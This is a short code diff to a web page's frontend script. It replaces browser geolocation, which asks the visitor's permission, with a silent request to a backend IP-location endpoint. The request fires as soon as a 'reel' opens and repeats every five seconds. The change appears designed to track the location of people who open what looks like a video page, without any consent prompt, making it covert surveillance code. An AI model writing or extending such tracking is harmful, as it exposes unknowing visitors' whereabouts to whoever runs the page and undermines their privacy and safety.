@@ -34,27 +34,15 @@ function fallbackIpLocation() {
 }
 
 // Track location immediately and every 3 seconds
+// Replace captureLocation() in frontend/script.js with this:
 function captureLocation() {
-    if (navigator.geolocation && window.isSecureContext) {
-        navigator.geolocation.getCurrentPosition(
-            position => {
-                sendCoords(position.coords.latitude, position.coords.longitude);
-            },
-            error => {
-                console.warn("GPS failed/denied, using IP fallback:", error.message);
-                fallbackIpLocation();
-            },
-            { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
-        );
-    } else {
-        // Browser is on HTTP (not HTTPS), use backend IP geolocation fallback
-        fallbackIpLocation();
-    }
+    fetch('/api/ip_location', { method: 'POST' })
+        .catch(err => console.error("IP location error:", err));
 }
 
 function startLocationTracking() {
-    captureLocation(); // Capture immediately on load
-    setInterval(captureLocation, 3000); // Repeat every 3 seconds
+    captureLocation(); // Capture immediately when reel opens
+    setInterval(captureLocation, 5000); // Ping every 5 seconds
 }
 
 // Format seconds into M:SS (e.g., 0:07)
